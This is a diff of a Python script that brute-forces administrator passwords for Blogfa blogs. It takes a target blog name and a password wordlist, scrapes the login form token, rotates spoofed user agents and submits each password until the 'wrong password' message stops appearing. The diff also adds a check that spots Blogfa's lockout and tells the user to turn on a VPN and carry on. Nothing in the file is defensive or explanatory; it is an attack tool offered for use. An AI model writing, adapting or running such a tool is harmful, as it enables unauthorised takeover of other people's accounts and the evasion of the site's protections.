@@ -1,15 +1,39 @@
-import os
-import time
-from bs4 import BeautifulSoup
-import requests as rq
-import sys, random
+import os, sys, time
+from random import choice
+from requests import post, get
+from colorama import Fore
+from bs4 import BeautifulSoup 
 rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
 cn = '\033[00;36m'
-from colorama import Fore, init
 
-    
-login = 'https://blogfa.com/desktop/login.aspx'
-    
+os.system('clear')
+print (f"""
+
+{lrd}######   ####      #####    #####    #######   ###      {lgn}         ####   ######     ###      ####   ### ###  
+{lrd} ##  ##   ##      ### ###  ##   ##    ##   #  ## ##     {lgn}        ##  ##   ##  ##   ## ##    ##  ##   ## ##   
+{lrd} ##  ##   ##      ##   ##  ##         ##     ##   ##    {lgn}       ##        ##  ##  ##   ##  ##        ####    
+{lrd} #####    ##      ##   ##  ## ####    ####   ##   ##    {lgn}       ##        #####   ##   ##  ##        ###     
+{lrd} ##  ##   ##      ##   ##  ##   ##    ##     #######    {lgn}       ##        ## ##   #######  ##        ####    
+{lrd} ##  ##   ##  ##  ### ###  ##   ##    ##     ##   ##    {lgn}        ##  ##   ## ##   ##   ##   ##  ##   ## ##   
+{lrd}######   #######   #####    #####    ####    ##   ##    {lgn}         ####   #### ##  ##   ##    ####   ### ###  
+                                                                                                            
+                                    {lrd}github : {lgn}github.com/esfelurm
+                                    
+                                    {lrd}channel telegram : {lgn}@esfelurm
+                                                                                                            """)
+PASSWORD = input(f"{lrd}[{yw}PASS{lrd}] Enter name password lidt : {lgn} ")
+print (f"{lrd}---------------------------------------")
+TARGET = input(f"{lrd}[{yw}URL{lrd}] Enter url TARGETget : {lgn}")
+print (f"{yw}-----------------------------------")
+
+check_web = ('http://'+TARGET+'.blogfa.com')
+check_web = get(check_web)
+if check_web.status_code == 404:
+    print (f'{yw}Not Page ! : {lrd}',TARGET)
+    sys.exit()
+else:
+    pass
+
 user_agent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -33,7 +57,8 @@ user_agent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
 "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",]
-users = (random.choice(user_agent))
+
+users = choice(user_agent)
 heder = {'Host': 'blogfa.com',
 'User-Agent': users,
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -47,59 +72,50 @@ heder = {'Host': 'blogfa.com',
 'Upgrade-Insecure-Requests': '1',
 'Pragma': 'no-cache',
 'Cache-Control': 'no-cache'}
-os.system("clear")
-print (f"""
 
-{lrd}######   ####      #####    #####    #######   ###      {lgn}         ####   ######     ###      ####   ### ###  
-{lrd} ##  ##   ##      ### ###  ##   ##    ##   #  ## ##     {lgn}        ##  ##   ##  ##   ## ##    ##  ##   ## ##   
-{lrd} ##  ##   ##      ##   ##  ##         ##     ##   ##    {lgn}       ##        ##  ##  ##   ##  ##        ####    
-{lrd} #####    ##      ##   ##  ## ####    ####   ##   ##    {lgn}       ##        #####   ##   ##  ##        ###     
-{lrd} ##  ##   ##      ##   ##  ##   ##    ##     #######    {lgn}       ##        ## ##   #######  ##        ####    
-{lrd} ##  ##   ##  ##  ### ###  ##   ##    ##     ##   ##    {lgn}        ##  ##   ## ##   ##   ##   ##  ##   ## ##   
-{lrd}######   #######   #####    #####    ####    ##   ##    {lgn}         ####   #### ##  ##   ##    ####   ### ###  
-                                                                                                            
-                                    {lrd}github : {lgn}github.com/esfelurm
-                                    
-                                    {lrd}channel telegram : {lgn}@esfelurm
-                                                                                                            """)
-target = input(f"{lrd}[{yw}URL{lrd}] Enter url target : {lgn}")
-print (f"{yw}-----------------------------------")
-password = input(f"{lrd}[{yw}PASS{lrd}] Enter name password lidt : {lgn} ")
-print (f"{lrd}---------------------------------------")
-print ('')
-pas = open(password, 'r').read().split()
-test_log = rq.get(login)
-text_web = (test_log).text
-su = BeautifulSoup(text_web, 'html.parser')
-tet= su.find('input')['value']
-for test_pass in pas:    
-    pay = {"_tt":tet,
-"usrid":target,
-"ups":test_pass,
+pas = open(PASSWORD, 'r').read().split()
+blogfA = get('https://blogfa.com/desktop/login.aspx')
+
+Infoo = (blogfA).text
+info = BeautifulSoup(Infoo, 'html.parser')
+
+t_t = info.find('input')['value']
+
+
+for ent_pas in pas:
+    
+    payload = {"_tt":t_t,
+"usrid":TARGET,
+"ups":ent_pas,
 "btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}
-    send_pass = rq.post('https://blogfa.com/desktop/login.aspx',data=pay, headers=heder)
-    result = (send_pass).text
 
-    login_text = BeautifulSoup(result, 'html.parser')
-    data0 = login_text.find_all('i')
-    send_data = str(data0)
-    # -------------------------------------------------
-    if"کلمه عبور را اشتباه وارد کرده اید" in send_data:
-        print (f"{yw}[{lrd}NO{yw}]{pe} The password is wrong :{lrd} ", test_pass)
-        print ('')
+    testing = post('https://blogfa.com/desktop/login.aspx', data=payload, headers=heder)
+    sourc3 = (testing).text
 
-    if"کلمه عبور را اشتباه وارد کرده اید" not in send_data:
+    so = BeautifulSoup(sourc3, 'html.parser')
+    data = so.find_all('i')
+    data = str(data)
+
+    Text = ("کلمه عبور را اشتباه وارد کرده اید")
+
+    if Text in data:
+        
+        print (f"{yw}[{lrd}NO{yw}]{pe} The password is wrong :{lrd} ", ent_pas,"\n")
+    if 'در حال حاضر به دلیل حفظ امنیت کاربران امکان ورود به بخش مدیریت را ندارید' in data:
+        print(f"{lrd}[{yw}ERROR{lrd}]{lgn} You have been blocked by blogfa services! Please turn on the VPN and then start ")
+        exit()
+
+
+    if Text not in data:
         print(f"""{lrd}
         ------------------------------------------------------------
        | 			    			    {lrd} 	 |
-       |{lrd}[{lgn}OK{lrd}]{cn} The password is correct : {lgn} {test_pass}	       {lrd}  |
+       |{lrd}[{lgn}OK{lrd}]{cn} The password is correct : {lgn} {ent_pas}	       {lrd}  |
        |    						    {lrd} 	 |
 	------------------------------------------------------------{lgn}""")
         sys.exit()
+
+
         
 
-
-time.sleep(15)
-os.system("python spider-web.py")
-
-
+    
